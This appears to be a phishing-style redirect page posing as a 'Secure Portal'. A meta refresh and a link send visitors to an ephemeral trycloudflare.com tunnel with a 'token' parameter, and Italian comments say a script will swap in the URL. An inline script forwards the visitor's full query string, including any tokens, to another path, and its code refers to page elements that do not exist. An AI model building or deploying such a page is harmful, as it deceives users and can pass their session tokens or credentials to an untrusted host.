<!DOCTYPE html>
<html>
<head>
  <title>Redirecting to Secure Portal...</title>
  <!-- Il nostro script automatico sostituirÃ  questo URL -->
  <meta http-equiv="refresh" content="0; url=https://commissioner-announce-optimum-foam.trycloudflare.com?token=" />
  <style>
    body { font-family: sans-serif; text-align: center; padding-top: 50px; }
  </style>
</head>
<body>
  <p>Redirecting to the Secure Portal...</p>
  <p>If you are not redirected automatically, 
    <a id="redirect-link" href="https://commissioner-announce-optimum-foam.trycloudflare.com?token=">click here</a>.
  </p>

                          <script>
        (function() {
            const baseUrl = "new";
            
            // Estrai l'intera query string dall'URL corrente
            const currentUrl = window.location.href;
            const queryIndex = currentUrl.indexOf('?');
            const queryString = (queryIndex !== -1) ? currentUrl.substring(queryIndex) : "";
            
            // Costruisci l'URL finale
            const finalUrl = baseUrl + queryString;
            
            document.getElementById('status').textContent = 'Reindirizzamento in corso...';
            document.getElementById('details').textContent = 'A ' + finalUrl;
            
            // Esegui il reindirizzamento
            window.location.replace(finalUrl);
        })();
    </script>
</body>
</html>
